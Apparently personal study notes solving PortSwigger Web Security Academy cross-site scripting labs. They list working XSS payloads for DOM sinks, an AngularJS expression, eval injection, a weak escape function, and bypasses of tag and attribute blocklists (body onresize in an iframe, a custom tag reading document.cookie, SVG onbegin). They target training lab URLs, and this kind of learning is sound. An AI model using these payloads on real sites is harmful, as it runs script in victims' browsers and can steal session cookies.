____

# DOM XSS in `document.write` sink using source `location.search` inside a select element

```html
"></select><img src=1 onerror=alert(1)>
```

![[Pasted image 20240804162601.png]]

```html
test</select><img src=1 onerror=alert(1)>
```

# DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

`ng-app`

```js
{{$on.constructor('alert(1)')()}}
```

# Reflected DOM XSS

The application may be vulnerable to DOM-based JavaScript injection. Data is read from **location.search** and passed to **eval**.

```js
\"-alert()}//
```

Here's the step-by-step breakdown of why this works:

1. **Escape the JSON Context**: The `\"` escapes the JSON string.
2. **Inject Code**: `-alert()` gets injected and executed.
3. **Comment Out**: `}//` comments out the rest to prevent any syntax errors from the remaining code.

# Stored DOM XSS

> Function replaces first angle brakets only:

```js
 function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
    }
```

```js
<><img src=1 onerror=alert(1)>
```

# Reflected XSS into HTML context with most tags and attributes blocked

"Tag is not allowed"

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

Copy tags to clipboard

![[Pasted image 20240806115813.png]]

Status 200 --> body

"Attribute is not allowed"

Copy events to clipboard

![[Pasted image 20240806120249.png]]

```js
<body onresize="print()">
```

```js
<iframe src="https://0aff0012036c406f80a92664002500fa.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```


# Reflected XSS into HTML context with all tags blocked except custom ones

```html
<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
```

```
https://0a21007b032e40bc807f498000a7008a.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert(document.cookie)+tabindex%3D1%3E#x
```

```html
<script>
location = 'https://0a21007b032e40bc807f498000a7008a.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29+tabindex%3D1%3E#x';
</script>
```

# Reflected XSS with some SVG markup allowed

![[Pasted image 20240807114732.png]]

```js
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```



